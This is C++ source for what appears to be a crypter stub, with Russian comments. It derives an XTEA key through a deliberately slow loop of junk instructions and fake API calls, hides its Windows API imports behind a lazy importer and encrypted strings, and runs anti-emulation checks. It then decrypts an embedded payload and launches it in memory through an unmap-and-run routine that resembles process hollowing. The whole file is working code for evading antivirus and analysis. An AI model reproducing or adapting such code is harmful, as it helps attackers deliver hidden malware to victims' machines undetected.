#include "pch.h"
#include <iostream>
#include <stdio.h>
#include <string.h>
#include "../../modules/modules.h"
#include "../../modules/antiemul/antiemul.h"
#include "../../modules/trash_gen_module/fake_api.h"
#include "../../modules/data_protect.h"
#include "../../modules/lazy_importer/lazy_importer.hpp"
#include "../../modules/data_crypt_string.h"

#define SLEEP_KEYGEN 50
#define SLEEP_WAIT 50
#define MEMORY_MALLOC 32*1024*1024

uint8_t *tmp_data = NULL;

/*
Функция генерирует пароль для расшифроки, по следующему алгоритму:

Генерируется массив случаных чисел от 0 до 9, далее генерируется хеш в качестве ключа, хеш генерируется на основе числа, 
сгенерированного при создании зашифрованного массива защищаемого файла.

Далее сортируется массив от 0 до 9, т.е. в итоге у нас получается хеши от числел 0-9. Отсортированные по порядку.

Параметры:

uint32_t pass[10] - Полученный пароль для расшифровки.
*/
static void pass_gen(uint32_t pass[10]) {

	uint32_t flag_found = 0;
	uint32_t count = 0;
	uint32_t i = 0;

	//Получаем рандомное число для соли murmurhash
	uint32_t eax_rand = 0;

	//Получение четырехбайтного значения eax_random
	memcpy(&eax_rand, data_protect, sizeof(int));

	printf("#");

	//Получаем массив, случайных числел от 1 до 10
	//Будет делаться случайно, плюс для антитрассировки будут вызываться случайно ассемблерные инструкции и API.
	while (1) {
		if (count == 10) break;
		uint32_t eax_random = do_Random_EAX(25, 50);
		uint32_t random = fake_api_instruction_gen(eax_random + 1, SLEEP_KEYGEN);

		if (pass[count] == random) {
			flag_found = 1;
			count++;
		}

		if (flag_found != 1) {
			if (count == random) {
				pass[count] = Murmur3(&random, sizeof(int), eax_rand);
				flag_found = 0;
				count++;
			}
		}
	}

	printf("#");

}

int main()
{
	static uint32_t passw[10];
	memset(passw, 0xff, sizeof(passw));
	pass_gen(passw);

	str_to_decrypt(kernel32, 13, &MAGIC, 4);
	auto base = reinterpret_cast<std::uintptr_t>(LI_FIND(LoadLibraryA)(kernel32));

	//Антиэмуляция **************************************
	anti_emul_sleep(base, NtUnmapView, 21, SLEEP_WAIT);

	//Антиэмуляция **************************************
	anti_emul_sleep(base, ntdll, 10, SLEEP_WAIT);

	//Получение имени самого себя
	wchar_t sfp[1024];
	LI_GET(base, GetModuleFileNameA)(0, LPSTR(sfp), 1024);
	
	//Получение четырехбайтного значения size_file
	uint32_t size_file = 0;
	memcpy(&size_file, data_protect+4, sizeof(int));
	XTEA_decrypt((uint8_t*)(data_protect + 8), size_file, passw, sizeof(passw));

	//Приведение типов:
	char* Putch_Char = (char*)sfp;

	printf("#");

	//Антиэмуляция
	uint8_t *protect_data = antiemul_mem(MEMORY_MALLOC, data_protect, size_file);

	printf("#");

	//Запуск данных в памяти
	run(base, Putch_Char, protect_data+8, ntdll, NtUnmapView);

	//Программа не завершает работу, а иммитирует действия из случайных инструкций и вызова API в случайном порядке.
	//Возможно лучше завершать, а может и нет.)))
	uint32_t random = 1;
	while (1) {
		uint32_t eax_random = do_Random_EAX(random, 50);
		random = fake_api_instruction_gen(eax_random + 1, random);
		random++;
	}

	return 0;
}
